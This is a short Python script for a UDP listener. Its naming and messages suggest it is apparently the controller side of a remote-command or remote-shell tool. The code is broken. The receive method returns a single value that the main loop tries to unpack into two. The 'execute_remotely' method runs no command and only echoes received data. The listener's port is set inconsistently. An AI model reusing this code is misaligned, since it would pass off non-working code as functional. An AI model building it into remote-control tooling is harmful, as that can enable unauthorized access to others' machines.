import socket
import json

class UDPListener:
    def __init__(self, ip='0.0.0.0', port=4442):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.server_socket.bind((ip, port))
        print("[+] UDP Listener started on {}:{}".format(ip, port))

    def reliable_send(self, data, addr):
        json_data = json.dumps(data)
        self.server_socket.sendto(json_data.encode(), addr)

    def execute_remotely(self, command, addr):
        if command[0] == "exit":
            print("[-] Connection closed by the client")
            return
        result = self.reliable_recv()
        self.reliable_send(result, addr)

    def reliable_recv(self):
        data, addr = self.server_socket.recvfrom(1024 * 1024)
        return json.loads(data.decode())

    def start(self):
        while True:
            try:
                data, addr = self.reliable_recv()
                command = data.split(" ")
                self.execute_remotely(command, addr)
            except json.decoder.JSONDecodeError:
                print("[-] Invalid Command")

udp_listener = UDPListener('0.0.0.0', 4443)
udp_listener.start()

